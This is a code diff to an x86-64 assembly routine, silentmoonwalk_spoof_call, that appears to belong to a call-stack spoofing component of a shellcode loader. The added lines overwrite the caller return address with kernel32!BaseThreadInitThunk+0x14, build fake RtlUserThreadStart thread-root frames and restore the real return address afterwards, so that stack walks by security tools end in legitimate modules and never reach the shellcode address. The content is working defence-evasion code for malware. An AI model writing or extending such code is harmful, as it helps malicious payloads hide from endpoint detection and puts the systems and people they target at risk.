@@ -58,6 +58,23 @@ silentmoonwalk_spoof_call:
     ;   RSP -> Desync Stack for Unwinding Info
     mov     rbp, rsp
 
+    ;   Point SMW_RETURN_ADDR at [rbp] so the unwinder reads the real-stack
+    ;   slot we patch below instead of the unbacked caller return address.
+    mov     rax, rbp
+    mov     [rcx + SMW_RETURN_ADDR], rax
+
+    ;   Stash the original caller return address in the spare shadow slot so
+    ;   restore can still return to the loader after the spoofed call.
+    mov     rax, [rbp]
+    mov     [rbp + 0x20], rax
+
+    ;   Overwrite the unbacked caller return address with a backed thread-root
+    ;   return address (kernel32!BaseThreadInitThunk + 0x14) so the stack walk
+    ;   terminates in kernel32 instead of aborting on the shellcode address.
+    mov     rax, [rcx + SMW_BASETHREAD]
+    add     rax, 0x14
+    mov     [rbp], rax
+
     ;   Creating stack pointer to Restore
     lea     rax, [rel restore]
     push    rax
@@ -92,6 +109,39 @@ silentmoonwalk_spoof_call:
     ;   2. Stack PIVOT (To restore original Control Flow Stack)
     push    qword [rcx + SMW_ADDRSP_GADGET]
 
+    ;   Store the AddRspX gadget frame size on the real stack; the unwinder
+    ;   reads it when walking the JMP [RBX] gadget frame so it lands back on
+    ;   the real thread-origin frames instead of the desync stack.
+    mov     rax, [rcx + SMW_ADDRSP_FRAME_SIZE]
+    mov     [rbp + 0x28], rax
+
+    ;   Synthesise the thread-root frames above the patched return address so
+    ;   the unwinder can walk BaseThreadInitThunk -> RtlUserThreadStart -> 0
+    ;   instead of reading raw stack pointers from the loader's real frame.
+    mov     r10, [rcx + SMW_BASETHREAD_FRAME_SIZE]
+    test    r10, r10
+    jz      .skip_thread_root
+    mov     r11, [rcx + SMW_RTLUSER_FRAME_SIZE]
+    test    r11, r11
+    jz      .skip_thread_root
+    mov     rax, [rcx + SMW_RTLUSER]
+    test    rax, rax
+    jz      .skip_thread_root
+
+    ;   BaseThreadInitThunk's parent return address = RtlUserThreadStart + 0x21
+    add     rax, 0x21
+    mov     r9, r10
+    add     r9, 0x08
+    mov     [rbp + r9], rax
+
+    ;   RtlUserThreadStart's parent return address = 0 (thread root)
+    mov     r9, r10
+    add     r9, r11
+    add     r9, 0x10
+    mov     qword [rbp + r9], 0
+
+.skip_thread_root:
+
     ;   Set the pointer to the function to call in RAX
     mov     rax, [rcx + SMW_SPOOF_FUNC]
     jmp     parameter_handler
@@ -101,6 +151,11 @@ restore:
     mov     rsp, rbp
     mov     rbp, [rsp + 0x08]
     mov     rbx, [rsp + 0x10]
+
+    ;   Put the original caller return address back before returning so the
+    ;   loader resumes where silentmoonwalk_spoof_call was invoked.
+    mov     r10, [rsp + 0x20]
+    mov     [rsp], r10
     ret
 
 parameter_handler:
